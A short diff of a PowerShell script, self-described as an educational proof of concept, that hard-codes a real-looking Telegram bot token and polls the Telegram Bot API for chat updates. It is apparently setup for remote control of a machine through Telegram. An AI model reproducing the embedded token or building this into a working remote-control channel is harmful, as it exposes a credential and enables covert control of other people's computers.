@@ -13,7 +13,7 @@ SETUP INSTRUCTIONS
 THIS SCRIPT IS A PROOF OF CONCEPT FOR EDUCATIONAL PURPOSES ONLY.
 #>
 #------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
-$Token = "TOKEN_HERE"  # Your Telegram Token
+$Token = "8993580297:AAEV7evE6bxjGfmPUR9hbbLiFFanyFvwMcQ"  # Your Telegram Token
 $URL='https://api.telegram.org/bot{0}' -f $Token 
 while($chatID.length -eq 0){
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
